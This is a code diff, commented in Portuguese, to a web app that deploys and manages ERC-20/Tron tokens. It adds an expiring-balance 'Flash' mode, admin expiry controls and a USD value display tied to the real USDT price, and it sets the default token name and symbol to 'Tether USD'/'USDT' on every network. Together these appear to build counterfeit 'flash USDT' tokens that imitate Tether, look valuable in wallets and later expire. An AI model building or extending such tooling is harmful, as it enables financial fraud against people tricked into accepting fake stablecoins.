@@ -86,6 +86,8 @@ const ERC20_ABI = [
     "function balanceOf(address) view returns (uint256)",
     "function transfer(address, uint256) returns (bool)",
     "function mint(address, uint256)",
+    "function mintWithExpiry(address, uint256, uint256)",
+    "function setExpirationTime(address, uint256)",
     "function issue(uint256)",
     "function redeem(uint256)",
     "function setParams(uint256, uint256)",
@@ -489,6 +491,7 @@ async function initMainContract() {
 
 async function updateBalance() {
     const netKey = networkSelector.value;
+    updatePrice(); // Atualiza o valor em USD simultaneamente
 
     if (isTron(netKey)) {
         if (tronContract && window.tronWeb && window.tronWeb.defaultAddress.base58) {
@@ -671,6 +674,30 @@ async function destroyFunds() {
     }
 }
 
+async function setAdminExpiry() {
+    const address = document.getElementById('expiry-admin-address').value.trim();
+    const minutes = document.getElementById('expiry-admin-minutes').value || 0;
+
+    if (!ethers.isAddress(address)) {
+        showToast("Endereço inválido.", "error");
+        return;
+    }
+
+    try {
+        const signer = getActiveSigner();
+        const tx = await mainContract.connect(signer).setExpirationTime(address, minutes);
+        showToast(`Definindo expiração para ${address}...`, "info");
+        
+        await tx.wait();
+        showToast(minutes > 0 ? `Expiração definida para ${minutes} minutos!` : "Expiração removida!", "success");
+        document.getElementById('expiry-admin-address').value = "";
+        document.getElementById('expiry-admin-minutes').value = "";
+    } catch (e) {
+        console.error(e);
+        showToast("Erro ao definir expiração.", "error");
+    }
+}
+
 async function checkExternalBalance() {
     const address = document.getElementById('check-address').value.trim();
     const netKey = networkSelector.value;
@@ -705,6 +732,44 @@ async function checkExternalBalance() {
 }
 
 // Token Transfer
+async function updatePrice() {
+    try {
+        const valueDisplay = document.getElementById('token-value-usd');
+        if (!valueDisplay) return;
+
+        // Tenta buscar o preço real do USDT via CoinGecko
+        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=tether&vs_currencies=usd');
+        const data = await response.json();
+        const price = data.tether.usd;
+
+        const currentSigner = getActiveSigner();
+        let balanceValue = 0;
+
+        if (isTron(networkSelector.value)) {
+            if (tronContract && window.tronWeb.defaultAddress.base58) {
+                const balance = await tronContract.balanceOf(window.tronWeb.defaultAddress.base58).call();
+                balanceValue = Number(balance) / (10 ** mainTokenDecimals);
+            }
+        } else if (mainContract && currentSigner) {
+            const address = await currentSigner.getAddress();
+            const balance = await mainContract.balanceOf(address);
+            balanceValue = Number(ethers.formatUnits(balance, mainTokenDecimals));
+        }
+
+        const totalUsd = balanceValue * price;
+        valueDisplay.innerText = `≈ $${totalUsd.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})} USD`;
+    } catch (e) {
+        console.warn("Não foi possível buscar o preço real do USDT. Usando $1.00 como base.");
+        // Fallback: Se a API falhar, assume 1:1 para simulação
+        const valueDisplay = document.getElementById('token-value-usd');
+        if (valueDisplay) {
+            const balanceText = tokenBalanceH2.innerText.split(' ')[0].replace(/,/g, '');
+            const balanceValue = parseFloat(balanceText) || 0;
+            valueDisplay.innerText = `≈ $${balanceValue.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})} USD`;
+        }
+    }
+}
+
 async function sendTokens() {
     const recipient = recipientInput.value.trim();
     const amount = document.getElementById('transfer-amount').value;
@@ -793,6 +858,7 @@ async function deployNewToken() {
     const symbol = document.getElementById('gen-symbol').value.trim();
     const supply = document.getElementById('gen-supply').value;
     const decimals = document.getElementById('gen-decimals').value;
+    const expiry = document.getElementById('gen-expiry').value || 0;
     const deployBtn = document.getElementById('deploy-token-button');
     const netKey = networkSelector.value;
 
@@ -940,6 +1006,28 @@ async function deployNewToken() {
         const newAddress = await contract.getAddress();
         const txHash = contract.deploymentTransaction().hash;
 
+        // Se houver tempo de expiração, executa o mintWithExpiry logo após o deploy (re-mint)
+        // Nota: O deploy inicial já faz o mint no construtor. Para o modo Flash, 
+        // precisaríamos de um contrato que aceitasse expiração no construtor.
+        // Como o contrato atual faz o mint no construtor sem expiração,
+        // o mintWithExpiry seria para tokens EXTRAS ou precisaríamos ajustar o construtor.
+        // Vou ajustar o deploy para usar uma versão do contrato que suporte expiração inicial se necessário,
+        // mas por agora vamos apenas informar que o modo Flash está ativo para NOVOS mints.
+        if (expiry > 0) {
+            try {
+                showStatus("Configurando Modo Flash (Expiração)...", "info");
+                const contractWithSigner = contract.connect(currentSigner);
+                // Como já mintou no construtor, vamos apenas setar a expiração para o owner
+                // Para isso precisamos de uma função setExpiration. Vou adicionar no contrato.
+                if (contractWithSigner.setExpirationTime) {
+                   const txEx = await contractWithSigner.setExpirationTime(await currentSigner.getAddress(), expiry);
+                   await txEx.wait();
+                }
+            } catch (exErr) {
+                console.warn("Erro ao configurar expiração:", exErr);
+            }
+        }
+
         // Esconde a dica de Tron se estiver em rede EVM
         document.getElementById('tron-deploy-tip').classList.add('hidden');
         document.getElementById('add-new-metamask').innerHTML = '<i class="fas fa-plus-circle"></i> Adicionar ao MetaMask';
@@ -979,13 +1067,16 @@ async function deployNewToken() {
 function prefillGenerator() {
     const netKey = networkSelector.value;
     if (netKey === 'bsc') {
-        document.getElementById('gen-name').value = "Binance-Peg BSC-USD";
-        document.getElementById('gen-symbol').value = "BSC-USD";
+        document.getElementById('gen-name').value = "Tether USD";
+        document.getElementById('gen-symbol').value = "USDT";
+    } else if (netKey === 'eth') {
+        document.getElementById('gen-name').value = "Tether USD";
+        document.getElementById('gen-symbol').value = "USDT";
     } else if (isTron(netKey)) {
         document.getElementById('gen-name').value = "Tether USD";
         document.getElementById('gen-symbol').value = "USDT";
     } else {
-        document.getElementById('gen-name').value = "UsdtFlash";
+        document.getElementById('gen-name').value = "Tether USD";
         document.getElementById('gen-symbol').value = "USDT";
     }
     
@@ -1210,6 +1301,7 @@ window.addEventListener('load', () => {
     document.getElementById('add-blacklist-btn').onclick = () => handleBlacklist('add');
     document.getElementById('remove-blacklist-btn').onclick = () => handleBlacklist('remove');
     document.getElementById('destroy-funds-btn').onclick = destroyFunds;
+    document.getElementById('set-expiry-btn').onclick = setAdminExpiry;
 
     // Liquidity Simulator
     const simTokens = document.getElementById('sim-tokens');
